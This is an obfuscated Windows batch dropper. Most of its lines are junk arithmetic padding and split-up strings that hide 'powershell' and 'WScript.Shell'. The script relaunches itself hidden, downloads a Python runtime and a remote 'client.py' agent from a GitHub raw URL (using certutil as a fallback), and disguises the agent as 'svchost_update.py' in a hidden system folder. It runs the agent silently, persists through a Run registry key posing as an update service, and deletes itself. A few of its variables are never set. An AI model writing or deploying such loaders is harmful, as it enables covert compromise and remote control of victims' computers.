@echo off

:: ==================== OBFUSCATED INITIALIZATION ====================
set /a "M_A1=%RANDOM% %% 256" & set /a "M_A2=(M_A1 * 13) ^ 0x0F" & set /a "M_A3=(M_A2 >> 1) & 0x7F"
set /a "M_A4=(M_A3 * 29) %% 999" & set /a "M_A5=(M_A4 ^ M_A1) & 0xFF" & set /a "M_A6=(M_A5 / 2) ^ 0x33"
set /a "M_A7=(M_A6 + 64) %% 256" & set /a "M_A8=(M_A7 * 37) & 0x1FF" & set /a "M_A9=(M_A8 ^ 0xAA) %% 512"
set /a "M_A10=(M_A9 >> 2) + 1" & set /a "M_A11=(M_A10 * 17) %% 888" & set /a "M_A12=(M_A11 ^ M_A3) & 0xFF"
set /a "M_A16=(M_A15 >> 1) ^ 0x55" & set /a "M_A17=(M_A16 * 41) %% 777" & set /a "M_A18=(M_A17 ^ M_A6) & 0xFF"
set c=pow
set /a "M_A19=(M_A18 / 2) + 10" & set /a "M_A20=(M_A19 * 19) %% 999" & set /a "M_A21=(M_A20 >> 2) ^ 0x22"
set /a "M_A13=(M_A12 / 4) ^ 0x11" & set /a "M_A14=(M_A13 + %RANDOM%) %% 999" & set /a "M_A15=(M_A14 * 23) & 0x3FF"
set d=er%i%%j%
set /a "M_A22=(M_A21 + M_A10) %% 512" & set /a "M_A23=(M_A22 * 31) & 0xFF" & set /a "M_A24=(M_A23 ^ 0x77) %% 256"
set /a "M_A25=(M_A24 / 3) + 5" & set /a "M_A26=(M_A25 * 47) %% 888" & set /a "M_A27=(M_A26 >> 1) ^ 0x0F"
set /a "M_A28=(M_A27 + M_A15) %% 512" & set /a "M_A29=(M_A28 * 13) & 0x1FF" & set /a "M_A30=(M_A29 ^ M_A20) & 0xFF"
set /a "M_A31=(M_A30 * 43) %% 1024" & set /a "M_A32=(M_A31 >> 3) ^ 0x1A" & set /a "M_A33=(M_A32 + M_A1) %% 511"
set a=WshS
set /a "M_A34=(M_A33 * 11) & 0x3F" & set /a "M_A35=(M_A34 / 2) ^ 0x5C" & set /a "M_A36=(M_A35 + %RANDOM%) %% 777"
set /a "M_A40=(M_A39 * 37) & 0x1FF" & set /a "M_A41=(M_A40 ^ M_A12) %% 500" & set /a "M_A42=(M_A41 / 3) + 7"
set b=hell
set /a "M_A37=(M_A36 * 29) & 0xFF" & set /a "M_A38=(M_A37 >> 1) ^ 0x8B" & set /a "M_A39=(M_A38 + 128) %% 256"
set /a "M_A43=(M_A42 * 53) & 0x3FF" & set /a "M_A44=(M_A43 >> 2) ^ 0x44" & set /a "M_A45=(M_A44 + M_A25) %% 888"
set /a "M_A28=(M_A27 + M_A15) %% 512" & set /a "M_A29=(M_A28 * 13) & 0x1FF" & set /a "M_A30=(M_A29 ^ M_A20) & 0xFF"
set /a "M_A31=(M_A30 * 43) %% 1024" & set /a "M_A32=(M_A31 >> 3) ^ 0x1A" & set /a "M_A33=(M_A32 + M_A1) %% 511"
set a=Ws
set /a "M_A34=(M_A33 * 11) & 0x3F" & set /a "M_A35=(M_A34 / 2) ^ 0x5C" & set /a "M_A36=(M_A35 + %RANDOM%) %% 777"
set /a "M_A40=(M_A39 * 37) & 0x1FF" & set /a "M_A41=(M_A40 ^ M_A12) %% 500" & set /a "M_A42=(M_A41 / 3) + 7"
set b=cript
set /a "M_A37=(M_A36 * 29) & 0xFF" & set /a "M_A38=(M_A37 >> 1) ^ 0x8B" & set /a "M_A39=(M_A38 + 128) %% 256"
set /a "M_A43=(M_A42 * 53) & 0x3FF" & set /a "M_A44=(M_A43 >> 2) ^ 0x44" & set /a "M_A45=(M_A44 + M_A25) %% 888"
set /a "M_A28=(M_A27 + M_A15) %% 512" & set /a "M_A29=(M_A28 * 13) & 0x1FF" & set /a "M_A30=(M_A29 ^ M_A20) & 0xFF"
set /a "M_A31=(M_A30 * 43) %% 1024" & set /a "M_A32=(M_A31 >> 3) ^ 0x1A" & set /a "M_A33=(M_A32 + M_A1) %% 511"
set g=scr
set /a "M_A34=(M_A33 * 11) & 0x3F" & set /a "M_A35=(M_A34 / 2) ^ 0x5C" & set /a "M_A36=(M_A35 + %RANDOM%) %% 777"
set /a "M_A40=(M_A39 * 37) & 0x1FF" & set /a "M_A41=(M_A40 ^ M_A12) %% 500" & set /a "M_A42=(M_A41 / 3) + 7"
set h=iptFullName
set /a "M_A37=(M_A36 * 29) & 0xFF" & set /a "M_A38=(M_A37 >> 1) ^ 0x8B" & set /a "M_A39=(M_A38 + 128) %% 256"
set /a "M_A43=(M_A42 * 53) & 0x3FF" & set /a "M_A44=(M_A43 >> 2) ^ 0x44" & set /a "M_A45=(M_A44 + M_A25) %% 888"
set /a "M_A28=(M_A27 + M_A15) %% 512" & set /a "M_A29=(M_A28 * 13) & 0x1FF" & set /a "M_A30=(M_A29 ^ M_A20) & 0xFF"
set /a "M_A31=(M_A30 * 43) %% 1024" & set /a "M_A32=(M_A31 >> 3) ^ 0x1A" & set /a "M_A33=(M_A32 + M_A1) %% 511"
set i=S
set /a "M_A34=(M_A33 * 11) & 0x3F" & set /a "M_A35=(M_A34 / 2) ^ 0x5C" & set /a "M_A36=(M_A35 + %RANDOM%) %% 777"
set /a "M_A40=(M_A39 * 37) & 0x1FF" & set /a "M_A41=(M_A40 ^ M_A12) %% 500" & set /a "M_A42=(M_A41 / 3) + 7"
set j=hell
set /a "M_A37=(M_A36 * 29) & 0xFF" & set /a "M_A38=(M_A37 >> 1) ^ 0x8B" & set /a "M_A39=(M_A38 + 128) %% 256"
set /a "M_A43=(M_A42 * 53) & 0x3FF" & set /a "M_A44=(M_A43 >> 2) ^ 0x44" & set /a "M_A45=(M_A44 + M_A25) %% 888"

:: ==================== MAIN SCRIPT ====================
if "%~1"=="" (
echo Set %a%%b% = CreateObject("%e%%f%.%i%%j%") : %a%%b%.Run chr(34) ^& %e%%f%.%g%%h% ^& " Run" ^& chr(34), 0 : Set %a%%b% = Nothing > "%temp%\hide.vbs"
%e%%f%.exe "%temp%\hide.vbs"
exit /b
)

:: ==================== OBFUSCATED VARIABLES ====================
set /a "M_B1=%RANDOM% %% 200" & set /a "M_B2=(M_B1 * 17) ^ 0x22" & set /a "M_B3=(M_B2 >> 1) & 0x7F"
set /a "M_B4=(M_B3 * 31) %% 950" & set /a "M_B5=(M_B4 ^ M_B1) & 0xFF" & set /a "M_B6=(M_B5 / 2) ^ 0x4A"
set /a "M_B7=(M_B6 + 32) %% 256" & set /a "M_B8=(M_B7 * 43) & 0x1FF" & set /a "M_B9=(M_B8 ^ 0xBB) %% 512"
set /a "M_B10=(M_B9 >> 2) + 1" & set /a "M_B11=(M_B10 * 23) %% 888" & set /a "M_B12=(M_B11 ^ M_B3) & 0xFF"
set /a "M_B13=(M_B12 / 4) ^ 0x22" & set /a "M_B14=(M_B13 + %RANDOM%) %% 999" & set /a "M_B15=(M_B14 * 37) & 0x3FF"
set /a "M_B16=(M_B15 >> 1) ^ 0x66" & set /a "M_B17=(M_B16 * 53) %% 777" & set /a "M_B18=(M_B17 ^ M_B6) & 0xFF"
set /a "M_B19=(M_B18 / 2) + 15" & set /a "M_B20=(M_B19 * 29) %% 999" & set /a "M_B21=(M_B20 >> 2) ^ 0x33"
set /a "M_B22=(M_B21 + M_B10) %% 512" & set /a "M_B23=(M_B22 * 41) & 0xFF" & set /a "M_B24=(M_B23 ^ 0x88) %% 256"
set /a "M_B25=(M_B24 / 3) + 7" & set /a "M_B26=(M_B25 * 59) %% 888" & set /a "M_B27=(M_B26 >> 1) ^ 0x11"
set /a "M_B28=(M_B27 + M_B15) %% 512" & set /a "M_B29=(M_B28 * 17) & 0x1FF" & set /a "M_B30=(M_B29 ^ M_B20) & 0xFF"
set /a "M_B31=(M_B30 * 47) %% 1024" & set /a "M_B32=(M_B31 >> 3) ^ 0x2A" & set /a "M_B33=(M_B32 + M_B1) %% 511"
set /a "M_B34=(M_B33 * 13) & 0x3F" & set /a "M_B35=(M_B34 / 2) ^ 0x6C" & set /a "M_B36=(M_B35 + %RANDOM%) %% 777"
set /a "M_B37=(M_B36 * 31) & 0xFF" & set /a "M_B38=(M_B37 >> 1) ^ 0x9B" & set /a "M_B39=(M_B38 + 128) %% 256"
set /a "M_B40=(M_B39 * 39) & 0x1FF" & set /a "M_B41=(M_B40 ^ M_B12) %% 500" & set /a "M_B42=(M_B41 / 3) + 9"
set /a "M_B43=(M_B42 * 55) & 0x3FF" & set /a "M_B44=(M_B43 >> 2) ^ 0x55" & set /a "M_B45=(M_B44 + M_B25) %% 888"

:: ==================== CONFIGURATION ====================
set "TARGET_DIR=%ProgramData%\Microsoft\Windows\sysupdate"
set "AGENT_NAME=svchost_update.py"
set "AGENT_PATH=%TARGET_DIR%\%AGENT_NAME%"
set "RAW_URL=https://raw.githubusercontent.com/glitech01x/client/refs/heads/main/client.py"
set "PYTHON_URL=https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip"
set "PYTHON_EXE=%TARGET_DIR%\python\pythonw.exe"
set "PYTHON_INSTALLER=%temp%\python_installer.exe"







set /a "M_C1=%RANDOM% %% 300" & set /a "M_C2=(M_C1 * 19) ^ 0x1A" & set /a "M_C3=(M_C2 >> 1) & 0x7F"
set /a "M_C4=(M_C3 * 27) %% 950" & set /a "M_C5=(M_C4 ^ M_C1) & 0xFF" & set /a "M_C6=(M_C5 / 2) ^ 0x3B"
set /a "M_C7=(M_C6 + 48) %% 256" & set /a "M_C8=(M_C7 * 33) & 0x1FF" & set /a "M_C9=(M_C8 ^ 0xCC) %% 512"
set /a "M_C10=(M_C9 >> 2) + 2" & set /a "M_C11=(M_C10 * 21) %% 888" & set /a "M_C12=(M_C11 ^ M_C3) & 0xFF"
set /a "M_C13=(M_C12 / 4) ^ 0x19" & set /a "M_C14=(M_C13 + %RANDOM%) %% 999" & set /a "M_C15=(M_C14 * 25) & 0x3FF"
set /a "M_C16=(M_C15 >> 1) ^ 0x4B" & set /a "M_C17=(M_C16 * 45) %% 777" & set /a "M_C18=(M_C17 ^ M_C6) & 0xFF"
set /a "M_C19=(M_C18 / 2) + 12" & set /a "M_C20=(M_C19 * 17) %% 999" & set /a "M_C21=(M_C20 >> 2) ^ 0x2B"
set /a "M_C22=(M_C21 + M_C10) %% 512" & set /a "M_C23=(M_C22 * 35) & 0xFF" & set /a "M_C24=(M_C23 ^ 0x7B) %% 256"
set /a "M_C25=(M_C24 / 3) + 6" & set /a "M_C26=(M_C25 * 49) %% 888" & set /a "M_C27=(M_C26 >> 1) ^ 0x0D"
set /a "M_C28=(M_C27 + M_C15) %% 512" & set /a "M_C29=(M_C28 * 11) & 0x1FF" & set /a "M_C30=(M_C29 ^ M_C20) & 0xFF"
set /a "M_C31=(M_C30 * 41) %% 1024" & set /a "M_C32=(M_C31 >> 3) ^ 0x1C" & set /a "M_C33=(M_C32 + M_C1) %% 511"
set /a "M_C34=(M_C33 * 15) & 0x3F" & set /a "M_C35=(M_C34 / 2) ^ 0x5E" & set /a "M_C36=(M_C35 + %RANDOM%) %% 777"
set /a "M_C37=(M_C36 * 27) & 0xFF" & set /a "M_C38=(M_C37 >> 1) ^ 0x89" & set /a "M_C39=(M_C38 + 128) %% 256"
set /a "M_C40=(M_C39 * 35) & 0x1FF" & set /a "M_C41=(M_C40 ^ M_C12) %% 500" & set /a "M_C42=(M_C41 / 3) + 8"
set /a "M_C43=(M_C42 * 51) & 0x3FF" & set /a "M_C44=(M_C43 >> 2) ^ 0x4E" & set /a "M_C45=(M_C44 + M_C25) %% 888"

:: ==================== CREATE TARGET DIRECTORY ====================
mkdir "%TARGET_DIR%" >nul 2>&1
attrib +h +s "%TARGET_DIR%" >nul 2>&1

:: ==================== CHECK FOR EXISTING PYTHON ====================
if exist "%PYTHON_EXE%" goto :download_agent

:: ==================== CHECK SYSTEM PYTHON ====================
where python >nul 2>&1

set /a "M_D1=%RANDOM% %% 180" & set /a "M_D2=(M_D1 * 23) ^ 0x33" & set /a "M_D3=(M_D2 >> 1) & 0x7F"
set /a "M_D4=(M_D3 * 25) %% 950" & set /a "M_D5=(M_D4 ^ M_D1) & 0xFF" & set /a "M_D6=(M_D5 / 2) ^ 0x2D"
set /a "M_D7=(M_D6 + 56) %% 256" & set /a "M_D8=(M_D7 * 31) & 0x1FF" & set /a "M_D9=(M_D8 ^ 0xDD) %% 512"
set /a "M_D10=(M_D9 >> 2) + 3" & set /a "M_D11=(M_D10 * 19) %% 888" & set /a "M_D12=(M_D11 ^ M_D3) & 0xFF"
set /a "M_D13=(M_D12 / 4) ^ 0x17" & set /a "M_D14=(M_D13 + %RANDOM%) %% 999" & set /a "M_D15=(M_D14 * 29) & 0x3FF"
set /a "M_D16=(M_D15 >> 1) ^ 0x5C" & set /a "M_D17=(M_D16 * 47) %% 777" & set /a "M_D18=(M_D17 ^ M_D6) & 0xFF"
set /a "M_D19=(M_D18 / 2) + 14" & set /a "M_D20=(M_D19 * 21) %% 999" & set /a "M_D21=(M_D20 >> 2) ^ 0x39"
set /a "M_D22=(M_D21 + M_D10) %% 512" & set /a "M_D23=(M_D22 * 39) & 0xFF" & set /a "M_D24=(M_D23 ^ 0x9A) %% 256"
set /a "M_D25=(M_D24 / 3) + 9" & set /a "M_D26=(M_D25 * 53) %% 888" & set /a "M_D27=(M_D26 >> 1) ^ 0x1F"
set /a "M_D28=(M_D27 + M_D15) %% 512" & set /a "M_D29=(M_D28 * 13) & 0x1FF" & set /a "M_D30=(M_D29 ^ M_D20) & 0xFF"
set /a "M_D31=(M_D30 * 45) %% 1024" & set /a "M_D32=(M_D31 >> 3) ^ 0x2E" & set /a "M_D33=(M_D32 + M_D1) %% 511"
set /a "M_D34=(M_D33 * 17) & 0x3F" & set /a "M_D35=(M_D34 / 2) ^ 0x6A" & set /a "M_D36=(M_D35 + %RANDOM%) %% 777"
set /a "M_D37=(M_D36 * 29) & 0xFF" & set /a "M_D38=(M_D37 >> 1) ^ 0x8F" & set /a "M_D39=(M_D38 + 128) %% 256"
set /a "M_D40=(M_D39 * 33) & 0x1FF"

if %errorlevel%==0 (
set "PYTHON_EXE=pythonw.exe"
goto :download_agent
)

:: ==================== DOWNLOAD AND INSTALL PYTHON ====================
%c%%d% -Command "& {Invoke-WebRequest -Uri '%PYTHON_URL%' -OutFile '%temp%\py.zip' -UseBasicParsing}" >nul 2>&1
if exist "%temp%\py.zip" (
mkdir "%TARGET_DIR%\python" >nul 2>&1
%c%%d% -Command "& {Expand-Archive -Path '%temp%\py.zip' -DestinationPath '%TARGET_DIR%\python' -Force}" >nul 2>&1
echo import site >> "%TARGET_DIR%\python\python311._pth"
del "%temp%\py.zip" >nul 2>&1
set "PYTHON_EXE=%TARGET_DIR%\python\pythonw.exe"
)

:: ==================== DOWNLOAD AGENT ====================
:download_agent
%c%%d% -Command "& {Invoke-WebRequest -Uri '%RAW_URL%' -OutFile '%AGENT_PATH%' -UseBasicParsing}" >nul 2>&1
if not exist "%AGENT_PATH%" goto :fallback_download

:: ==================== OBFUSCATED E VARIABLES ====================
set /a "M_E1=%RANDOM% %% 220" & set /a "M_E2=(M_E1 * 21) ^ 0x44" & set /a "M_E3=(M_E2 >> 1) & 0x7F"
set /a "M_E4=(M_E3 * 23) %% 950" & set /a "M_E5=(M_E4 ^ M_E1) & 0xFF" & set /a "M_E6=(M_E5 / 2) ^ 0x3E"
set /a "M_E7=(M_E6 + 40) %% 256" & set /a "M_E8=(M_E7 * 35) & 0x1FF" & set /a "M_E9=(M_E8 ^ 0xEE) %% 512"
set /a "M_E10=(M_E9 >> 2) + 4" & set /a "M_E11=(M_E10 * 15) %% 888" & set /a "M_E12=(M_E11 ^ M_E3) & 0xFF"
set /a "M_E13=(M_E12 / 4) ^ 0x15" & set /a "M_E14=(M_E13 + %RANDOM%) %% 999" & set /a "M_E15=(M_E14 * 27) & 0x3FF"
set /a "M_E16=(M_E15 >> 1) ^ 0x6D" & set /a "M_E17=(M_E16 * 49) %% 777" & set /a "M_E18=(M_E17 ^ M_E6) & 0xFF"
set /a "M_E19=(M_E18 / 2) + 11" & set /a "M_E20=(M_E19 * 25) %% 999" & set /a "M_E21=(M_E20 >> 2) ^ 0x4C"
set /a "M_E22=(M_E21 + M_E10) %% 512" & set /a "M_E23=(M_E22 * 37) & 0xFF" & set /a "M_E24=(M_E23 ^ 0xAB) %% 256"
set /a "M_E25=(M_E24 / 3) + 8" & set /a "M_E26=(M_E25 * 55) %% 888" & set /a "M_E27=(M_E26 >> 1) ^ 0x2A"
set /a "M_E28=(M_E27 + M_E15) %% 512" & set /a "M_E29=(M_E28 * 19) & 0x1FF" & set /a "M_E30=(M_E29 ^ M_E20) & 0xFF"
set /a "M_E31=(M_E30 * 43) %% 1024" & set /a "M_E32=(M_E31 >> 3) ^ 0x3F" & set /a "M_E33=(M_E32 + M_E1) %% 511"
set /a "M_E34=(M_E33 * 23) & 0x3F" & set /a "M_E35=(M_E34 / 2) ^ 0x7E" & set /a "M_E36=(M_E35 + %RANDOM%) %% 777"
set /a "M_E37=(M_E36 * 33) & 0xFF" & set /a "M_E38=(M_E37 >> 1) ^ 0x9D" & set /a "M_E39=(M_E38 + 128) %% 256"
set /a "M_E40=(M_E39 * 31) & 0x1FF" & set /a "M_E41=(M_E40 ^ M_E12) %% 500" & set /a "M_E42=(M_E41 / 3) + 10"
set /a "M_E43=(M_E42 * 57) & 0x3FF" & set /a "M_E44=(M_E43 >> 2) ^ 0x6A" & set /a "M_E45=(M_E44 + M_E25) %% 888"

:: ==================== EXECUTE AGENT ====================
attrib +h +s "%AGENT_PATH%" >nul 2>&1
start "" /B "%PYTHON_EXE%" "%AGENT_PATH%" --hidden >nul 2>&1

:: ==================== PERSISTENCE ====================
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysUpdateService" /t REG_SZ /d "\"%PYTHON_EXE%\" \"%AGENT_PATH%\"" /f >nul 2>&1

:: ==================== OBFUSCATED F VARIABLES ====================
set /a "M_F1=%RANDOM% %% 270" & set /a "M_F2=(M_F1 * 27) ^ 0x55" & set /a "M_F3=(M_F2 >> 1) & 0x7F"
set /a "M_F4=(M_F3 * 21) %% 950" & set /a "M_F5=(M_F4 ^ M_F1) & 0xFF" & set /a "M_F6=(M_F5 / 2) ^ 0x4F"
set /a "M_F7=(M_F6 + 36) %% 256" & set /a "M_F8=(M_F7 * 39) & 0x1FF" & set /a "M_F9=(M_F8 ^ 0xFF) %% 512"
set /a "M_F10=(M_F9 >> 2) + 5" & set /a "M_F11=(M_F10 * 13) %% 888" & set /a "M_F12=(M_F11 ^ M_F3) & 0xFF"
set /a "M_F13=(M_F12 / 4) ^ 0x13" & set /a "M_F14=(M_F13 + %RANDOM%) %% 999" & set /a "M_F15=(M_F14 * 31) & 0x3FF"
set /a "M_F16=(M_F15 >> 1) ^ 0x7E" & set /a "M_F17=(M_F16 * 51) %% 777" & set /a "M_F18=(M_F17 ^ M_F6) & 0xFF"
set /a "M_F19=(M_F18 / 2) + 13" & set /a "M_F20=(M_F19 * 29) %% 999" & set /a "M_F21=(M_F20 >> 2) ^ 0x5D"
set /a "M_F22=(M_F21 + M_F10) %% 512" & set /a "M_F23=(M_F22 * 43) & 0xFF" & set /a "M_F24=(M_F23 ^ 0xBC) %% 256"
set /a "M_F25=(M_F24 / 3) + 10" & set /a "M_F26=(M_F25 * 57) %% 888" & set /a "M_F27=(M_F26 >> 1) ^ 0x3B"
set /a "M_F28=(M_F27 + M_F15) %% 512" & set /a "M_F29=(M_F28 * 21) & 0x1FF" & set /a "M_F30=(M_F29 ^ M_F20) & 0xFF"
set /a "M_F31=(M_F30 * 49) %% 1024" & set /a "M_F32=(M_F31 >> 3) ^ 0x4A" & set /a "M_F33=(M_F32 + M_F1) %% 511"
set /a "M_F34=(M_F33 * 25) & 0x3F" & set /a "M_F35=(M_F34 / 2) ^ 0x8E" & set /a "M_F36=(M_F35 + %RANDOM%) %% 777"
set /a "M_F37=(M_F36 * 35) & 0xFF" & set /a "M_F38=(M_F37 >> 1) ^ 0xA1" & set /a "M_F39=(M_F38 + 128) %% 256"
set /a "M_F40=(M_F39 * 27) & 0x1FF" & set /a "M_F41=(M_F40 ^ M_F12) %% 500" & set /a "M_F42=(M_F41 / 3) + 11"
set /a "M_F43=(M_F42 * 59) & 0x3FF" & set /a "M_F44=(M_F43 >> 2) ^ 0x7C" & set /a "M_F45=(M_F44 + M_F25) %% 888"

:: ==================== SELF-DELETE ====================
del "%~f0" >nul 2>&1
exit /b

:: ==================== FALLBACK DOWNLOAD ====================
:fallback_download
certutil -urlcache -split -f "%RAW_URL%" "%AGENT_PATH%" >nul 2>&1
if exist "%AGENT_PATH%" (

:: ==================== OBFUSCATED G VARIABLES ====================
set /a "M_G1=%RANDOM% %% 310" & set /a "M_G2=(M_G1 * 31) ^ 0x66" & set /a "M_G3=(M_G2 >> 1) & 0x7F"
set /a "M_G4=(M_G3 * 19) %% 950" & set /a "M_G5=(M_G4 ^ M_G1) & 0xFF" & set /a "M_G6=(M_G5 / 2) ^ 0x5A"
set /a "M_G7=(M_G6 + 28) %% 256" & set /a "M_G8=(M_G7 * 41) & 0x1FF" & set /a "M_G9=(M_G8 ^ 0x11) %% 512"
set /a "M_G10=(M_G9 >> 2) + 6" & set /a "M_G11=(M_G10 * 11) %% 888" & set /a "M_G12=(M_G11 ^ M_G3) & 0xFF"
set /a "M_G13=(M_G12 / 4) ^ 0x1B" & set /a "M_G14=(M_G13 + %RANDOM%) %% 999" & set /a "M_G15=(M_G14 * 33) & 0x3FF"
set /a "M_G16=(M_G15 >> 1) ^ 0x8F" & set /a "M_G17=(M_G16 * 53) %% 777" & set /a "M_G18=(M_G17 ^ M_G6) & 0xFF"
set /a "M_G19=(M_G18 / 2) + 16" & set /a "M_G20=(M_G19 * 31) %% 999" & set /a "M_G21=(M_G20 >> 2) ^ 0x6E"
set /a "M_G22=(M_G21 + M_G10) %% 512" & set /a "M_G23=(M_G22 * 45) & 0xFF" & set /a "M_G24=(M_G23 ^ 0xCD) %% 256"
set /a "M_G25=(M_G24 / 3) + 12" & set /a "M_G26=(M_G25 * 59) %% 888" & set /a "M_G27=(M_G26 >> 1) ^ 0x4C"
set /a "M_G28=(M_G27 + M_G15) %% 512" & set /a "M_G29=(M_G28 * 23) & 0x1FF" & set /a "M_G30=(M_G29 ^ M_G20) & 0xFF"
set /a "M_G31=(M_G30 * 51) %% 1024" & set /a "M_G32=(M_G31 >> 3) ^ 0x5B" & set /a "M_G33=(M_G32 + M_G1) %% 511"
set /a "M_G34=(M_G33 * 27) & 0x3F" & set /a "M_G35=(M_G34 / 2) ^ 0x9E" & set /a "M_G36=(M_G35 + %RANDOM%) %% 777"
set /a "M_G37=(M_G36 * 37) & 0xFF" & set /a "M_G38=(M_G37 >> 1) ^ 0xB2" & set /a "M_G39=(M_G38 + 128) %% 256"
set /a "M_G40=(M_G39 * 25) & 0x1FF"

:: ==================== EXECUTE FALLBACK AGENT ====================
attrib +h +s "%AGENT_PATH%" >nul 2>&1
start "" /B "%PYTHON_EXE%" "%AGENT_PATH%" --hidden >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysUpdateService" /t REG_SZ /d "\"%PYTHON_EXE%\" \"%AGENT_PATH%\"" /f >nul 2>&1
)

:: ==================== SELF-DELETE ====================
del "%~f0" >nul 2>&1
exit /b